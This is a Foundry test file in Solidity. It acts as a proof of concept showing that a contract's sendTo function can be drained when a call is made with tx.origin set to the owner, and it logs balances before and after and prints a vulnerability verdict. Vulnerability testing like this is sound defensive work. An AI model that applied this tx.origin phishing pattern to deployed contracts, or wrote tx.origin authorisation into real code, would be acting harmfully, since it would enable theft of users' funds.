// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mycontract.sol";

contract MyContractTest is Test {
    MyContract public myContract;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy contract by owner
        vm.prank(owner);
        myContract = new MyContract();
        
        // Fund contract with ETH
        vm.deal(address(myContract), 1 ether);
    }

    function testArbitraryEthTransferViaTxOrigin() public {
        console.log("--- BEFORE-Trigger State ---");
        // Capture all pre-trigger states
        uint256 contractBalanceBefore = address(myContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 totalTransfersBefore = myContract.totalTransfers();
        uint256 attackerRecipientBalanceBefore = myContract.recipientBalances(attacker);

        console.log("Contract ETH balance before: %s", contractBalanceBefore);
        console.log("Attacker ETH balance before: %s", attackerBalanceBefore);
        console.log("Total transfers before: %s", totalTransfersBefore);
        console.log("Recipient balance for attacker before: %s", attackerRecipientBalanceBefore);

        // Verify contract has initialized ETH
        assertEq(contractBalanceBefore, 1 ether, "Contract should have 1 ether");

        console.log("--- Trigger Operation: sendTo(attacker, 1 ether) ---");
        // Perform attack - Attacker calls with tx.origin being owner
        vm.prank(attacker, owner);
        myContract.sendTo(attacker, 1 ether);

        console.log("--- AFTER-Trigger State ---");
        // Capture all post-trigger states
        uint256 contractBalanceAfter = address(myContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 totalTransfersAfter = myContract.totalTransfers();
        uint256 attackerRecipientBalanceAfter = myContract.recipientBalances(attacker);

        console.log("Contract ETH balance after: %s", contractBalanceAfter);
        console.log("Attacker ETH balance after: %s", attackerBalanceAfter);
        console.log("Total transfers after: %s", totalTransfersAfter);
        console.log("Recipient balance for attacker after: %s", attackerRecipientBalanceAfter);

        // Validate state changes
        bool transferSucceeded = 
            (contractBalanceAfter == 0) &&
            (attackerBalanceAfter == attackerBalanceBefore + 1 ether) &&
            (totalTransfersAfter == totalTransfersBefore + 1) &&
            (attackerRecipientBalanceAfter == attackerRecipientBalanceBefore + 1 ether);

        // Final vulnerability verdict
        if (transferSucceeded) {
            console.log("Vulnerability Exists: Arbitrary ETH transfer achieved via tx.origin");
        } else {
            console.log("Vulnerability not Exist: Transaction did not have expected impact");
        }
    }
}